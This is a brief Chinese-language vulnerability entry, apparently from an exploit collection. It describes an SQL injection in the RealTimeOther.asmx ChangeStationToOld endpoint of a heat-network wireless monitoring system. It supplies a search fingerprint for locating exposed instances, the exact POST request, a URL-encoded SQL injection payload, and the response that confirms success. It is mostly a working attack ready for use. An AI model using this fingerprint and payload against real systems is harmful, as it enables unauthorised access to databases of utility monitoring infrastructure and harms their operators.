# 热网无线监测系统RealTimeOther.asmx存在SQL注入漏洞

热网无线监测系统 ｜ SQL注入 ｜ —
- **指纹**：`body="Downloads/HDPrintInstall.rar"`
- **请求**：`POST /DataSrvs/RealTimeOther.asmx/ChangeStationToOld HTTP/1.1`

**Payload**
```
stationID=%28SELECT+CHAR%28113%29%2BCHAR%28106%29%2BCHAR%28112%29%2BCHAR%28120%29%2BCHAR%28113%29%2B%28CASE+WHEN+%289253%3D9253%29+THEN+CHAR%2849%29+ELSE+CHAR%2848%29+END%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28112%29%2BCHAR%28106%29%2BCHAR%28113%29%29
```
- **响应特征**：500